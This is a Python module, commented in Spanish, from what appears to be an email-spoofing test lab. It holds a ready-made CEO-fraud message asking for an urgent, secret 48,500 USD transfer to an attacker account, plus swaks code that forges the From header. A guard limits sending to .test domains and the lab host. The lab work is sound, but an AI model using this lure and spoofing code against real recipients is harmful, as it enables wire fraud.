"""Piezas comunes de los ataques: validación de destino, texto del fraude y envío con swaks."""

from __future__ import annotations

import re
import subprocess
import uuid
from dataclasses import asdict, dataclass

# Regla 3 de CLAUDE.md: solo dominios .test y solo el host «receptor».
ALLOWED_SERVER = "receptor"
DEFAULT_RECIPIENT = "empleado@bancoseguro.test"
_TEST_DOMAIN = re.compile(r"^[a-z0-9-]+(\.[a-z0-9-]+)*\.test$")

SUBJECT = "Transferencia urgente"
ATTACKER_ACCOUNT = "9999-6666-00"
BODY = f"""Hola:

Necesito que hoy mismo hagas una transferencia de 48.500 USD a la cuenta
{ATTACKER_ACCOUNT} (Consultores Asociados). Es para cerrar una adquisición
confidencial, así que no lo comentes con nadie todavía.

Estoy en reuniones toda la tarde; respóndeme solo por correo cuando esté hecho.

Gracias,
Director General
Banco Seguro
"""


class DestinationError(ValueError):
    """El destino no es del laboratorio: el ataque no se envía."""


def validate_destination(recipient: str, server: str) -> None:
    """Aborta si el destinatario no es de un dominio .test o el servidor no es «receptor»."""
    domain = recipient.rpartition("@")[2].lower()
    if "@" not in recipient or not _TEST_DOMAIN.match(domain):
        raise DestinationError(
            f"Destinatario no permitido: «{recipient}». Este laboratorio solo envía "
            "correo a dominios .test (RFC 2606). No se envió nada."
        )
    if server != ALLOWED_SERVER:
        raise DestinationError(
            f"Servidor no permitido: «{server}». Los ataques solo pueden ir al host "
            f"«{ALLOWED_SERVER}» del laboratorio. No se envió nada."
        )


@dataclass(frozen=True)
class Attack:
    id: str
    description: str
    envelope_from: str  # MAIL FROM (sobre)
    header_from: str  # From: (lo que ve el usuario)
    dkim: str  # firma DKIM que lleva


@dataclass
class AttackResult:
    attack: str
    accepted: bool
    code: int
    reply: str
    message_id: str
    envelope_from: str
    header_from: str
    transcript: str

    def to_dict(self) -> dict[str, object]:
        return asdict(self)


_REPLY = re.compile(r"^<(-|\*\*) +(\d{3})[ -](.*)$")


def summarize_swaks(transcript: str) -> tuple[int, str]:
    """Devuelve (código, texto) de la respuesta que decide el destino del correo.

    Si el servidor rechazó algo (líneas `<**`), es el primer rechazo. Si no, es la
    respuesta al final de DATA, la última antes de QUIT.
    """
    replies: list[tuple[bool, int, str]] = []
    for line in transcript.splitlines():
        if line.strip() == "-> QUIT":
            break
        match = _REPLY.match(line.strip())
        if match:
            replies.append((match.group(1) == "**", int(match.group(2)), match.group(3)))
    for is_error, code, text in replies:
        if is_error:
            return code, text
    if not replies:
        return 0, "Sin respuesta del servidor"
    _, code, text = replies[-1]
    return code, text


def send_with_swaks(
    attack: Attack,
    recipient: str = DEFAULT_RECIPIENT,
    server: str = ALLOWED_SERVER,
    extra_args: list[str] | None = None,
) -> AttackResult:
    validate_destination(recipient, server)
    message_id = f"<{uuid.uuid4()}@{attack.header_from.rpartition('@')[2].rstrip('>')}>"
    cmd = [
        "swaks",
        "--server", server,
        "--port", "25",
        "--helo", "mail.atacante.test",
        "--from", attack.envelope_from,
        "--to", recipient,
        "--header", f"From: {attack.header_from}",
        "--header", f"Subject: {SUBJECT}",
        "--header", f"Message-Id: {message_id}",
        "--header", "MIME-Version: 1.0",
        "--header", "Content-Type: text/plain; charset=UTF-8",
        "--header", "Content-Transfer-Encoding: 8bit",
        "--body", BODY,
        "--timeout", "30",
        *(extra_args or []),
    ]  # fmt: skip
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60, check=False)
    transcript = proc.stdout + proc.stderr
    code, reply = summarize_swaks(transcript)
    return AttackResult(
        attack=attack.id,
        accepted=200 <= code < 300,
        code=code,
        reply=reply,
        message_id=message_id.strip("<>"),
        envelope_from=attack.envelope_from,
        header_from=attack.header_from,
        transcript=transcript,
    )
